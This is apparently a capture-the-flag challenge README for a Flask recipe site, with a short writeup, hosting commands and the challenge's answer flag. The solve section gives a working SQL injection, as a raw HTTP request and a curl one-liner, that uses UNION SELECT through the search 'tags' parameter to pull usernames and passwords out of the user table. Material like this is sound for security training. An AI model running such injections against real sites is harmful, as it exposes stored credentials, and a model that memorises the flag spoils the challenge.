# Cooking Flask
Description:
```markdown
I threw together my own website! It's halfway done. Right now, you can search for recipes and stuff. I don't know a ton about coding and DBs, but I think I know enough so that no one can steal my admin password... I do know a lot about cooking though. All this food is going to make me burp. Sweet, well good luck

https://cooking.chal.cyberjousting.com
```

**Author**: `bluecougar`

## Writeup
Basically the premise is the guy is just vibe coding and doesn't know how to properly parameterize a certain field and doesn't know to turn off debug mode.

Solve:
```
GET /search?recipe_name=&description=&tags=breakfast"%')+Union+Select+1,password,'2012-10-10','d',username,'f','[]',7+from+user-- HTTP/1.1
Host: cooking.chal.cyberjousting.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.0.175:8080/search?recipe_name=&description=&tags=Breakfast
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
```

`curl 'https://cooking.chal.cyberjousting.com/search?recipe_name=&description=&tags=breakfast"%'\'')+Union+Select+1,password,'\''2012-10-10'\'','\''d'\'',username,'\''f'\'','\''[]'\'',7+from+user--' | grep -o 'byuctf.*}'`

For a full writeup, see [`Writeup.md`](./Writeup.md).

**Flag** - `byuctf{pl34s3_p4r4m3t3r1z3_y0ur_1nputs_4nd_h4sh_p4ssw0rds}`

## Hosting
This challenge should be a Docker container that runs a Flask webserver on port 5001. All the proper files are included in here. The command to build the docker container is (when located inside of this directory):

```bash
docker compose up -d
```

To stop the challenge:
```bash
docker compose down
```